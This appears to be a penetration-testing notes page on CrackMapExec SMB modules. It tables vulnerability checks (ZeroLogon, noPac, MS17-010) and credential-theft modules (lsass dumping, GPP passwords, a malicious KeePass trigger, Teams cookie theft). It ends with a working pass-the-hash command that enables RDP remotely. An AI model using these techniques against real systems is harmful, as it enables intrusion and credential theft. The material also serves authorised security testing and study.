---
description: CrackMapExec Modules to attack SMB Protocol.
cover: ../../../.gitbook/assets/CrackMapExec - SMB Modules.png
coverY: 0
---

# 🟢 SMB Modules

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<div align="center">

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

</div>

### Vulnerabilities <a href="#vulnerabilities" id="vulnerabilities"></a>

|  SMB Module  |                                                   Description                                                  |
| :----------: | :------------------------------------------------------------------------------------------------------------: |
|   ZeroLogon  |                     Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472                     |
|  Petitpotam  |                    Module to check if the DC is vulnerable to PetitPotam, credit to @topotam                   |
|   ms17-010   |                                    MS17-010, /!\ not tested oustide home lab                                   |
|   dfscoerce  |    Module to check if the DC is vulnerable to DFSCocerc, credit to @filip\_dragovic/@Wh04m1001 and @topotam    |
|     nopac    | Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user |
| shadowcoerce |          Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam         |

### Credentials <a href="#credentials" id="credentials"></a>

|       Module      |                                                        Description                                                        |
| :---------------: | :-----------------------------------------------------------------------------------------------------------------------: |
|   gpp\_autologin  |    Searches the domain controller for registry.xml to find autologon information and returns the username and password.   |
|   gpp\_password   |        Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.       |
|     handlekatz    |                            Get lsass dump using handlekatz64 and parse the result with pypykatz                           |
|    hash\_spider   |                           Dump lsass recursively from a given hash using BH to find local admins                          |
| keepass\_discover |                                       Search for KeePass-related files and process.                                       |
|  keepass\_trigger |                          Set up a malicious KeePass trigger to export the database in cleartext.                          |
|       lsassy      |                                    Dump lsass and parse the result remotely with lsassy                                   |
|       masky       |                                Remotely dump domain user credentials via an ADCS and a KDC                                |
|   teams\_localdb  | Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process |
|      wdigest      |           Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1           |
|      wireless     |                                             Get key of all wireless interfaces                                            |

### Remote Code Execution

#### Activate RDP on the remote Host

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>RDP Activation</p></figcaption></figure>

```
crackmapexec smb 10.9.20.13 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:7574cbf9d92c39d1d4dccd7b89301d2f' -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
```
